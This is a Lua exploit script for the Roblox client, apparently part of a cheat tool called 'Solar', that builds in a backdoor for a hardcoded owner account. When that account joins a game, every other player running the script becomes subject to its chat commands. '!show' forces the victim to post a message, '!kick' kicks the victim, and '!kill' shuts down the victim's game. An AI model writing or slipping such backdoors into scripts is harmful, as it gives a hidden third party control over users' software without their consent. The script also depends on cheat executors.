

getgenv().Host = "twistedworId"
if game.Players:FindFirstChild("twistedworId") then
if syn then
rconsoleprint("owner of Solar has joined your game!")
else
        game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("The owner of Solar has joined your game", 'All');
        end
local ismainaccount = false
if game.Players.LocalPlayer.Name == getgenv().Host then
    ismainaccount = true
end


local players, replicatedStorage = game:GetService("Players"), game:GetService("ReplicatedStorage");
local defaultChatSystemChatEvents = replicatedStorage:FindFirstChild("DefaultChatSystemChatEvents");

local onMessageDoneFiltering = defaultChatSystemChatEvents:FindFirstChild("OnMessageDoneFiltering");


wait()
   if ismainaccount == false then
       
onMessageDoneFiltering.OnClientEvent:Connect(function(messageData)
    local speaker, message = players[messageData.FromSpeaker], messageData.Message

    if speaker.Name == getgenv().Host and message == "!show" then
        game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("SolarW! The solar owner made me send this message.", 'All');

	elseif speaker.Name == getgenv().Host and message == "!kick" then
game.Players.LocalPlayer:Kick("owner of Solar has kicked you!")
elseif speaker.Name == getgenv().Host and message == "!kill" then
game:Shutdown()

end
end)
end
end
